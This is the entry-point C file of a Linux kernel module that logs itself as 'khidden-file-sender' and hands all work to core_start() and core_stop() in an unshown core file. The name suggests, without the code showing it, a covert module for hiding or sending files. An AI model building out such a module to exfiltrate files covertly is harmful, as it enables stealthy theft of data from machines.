#include "core.h"

#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("spiderpig");
MODULE_VERSION("1.0.0");

static int __init mod_init(void)
{
    printk(KERN_INFO "khidden-file-sender: LKM loaded\n");

    core_start();

    return 0; 
}

static void __exit mod_exit(void)
{
    core_stop();

    printk(KERN_INFO "khidden-file-sender: LKM unloaded succesfully\n");
}

module_init(mod_init);
module_exit(mod_exit);